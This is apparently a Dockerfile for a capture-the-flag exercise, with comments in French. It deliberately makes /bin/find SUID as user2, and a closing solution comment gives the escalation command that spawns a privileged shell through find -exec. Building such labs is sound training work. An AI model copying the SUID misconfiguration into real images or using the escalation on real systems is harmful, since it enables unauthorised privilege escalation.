FROM ctf:latest
ARG SSH_PASS
ARG FLAG

RUN echo "ctf:${SSH_PASS}" | chpasswd

# MaJ de sudo
RUN apt-get update && apt-get install -y sudo 


# Création des utilisateurs 
RUN useradd -m -s /bin/bash user2

# Définition du répertoire personnel pour chaque utilisateur 
RUN usermod -d /home/user2 user2 

# Changement du propriétaire des répertoires personnels 
RUN chown user2:user2 /home/user2

# Changement des permissions sur les répertoires personnels 
RUN chmod 700 /home/user2 

#Ajout des différents flags dans les home directory de nos 3 utilisateurs
RUN echo $FLAG > /home/user2/flag2.txt

# Ajout de la vuln num 2 : SUID de user2 sur le binaire find. En se référant a GTFOBins, on peut faire une PE et devenir user2
RUN chown user2:user2 /bin/find && chmod u+s /bin/find 

#SOLUTION :
# find / -perm -04000 -type f 2>/dev/null
# /bin/find . -exec /bin/sh -p \; -quit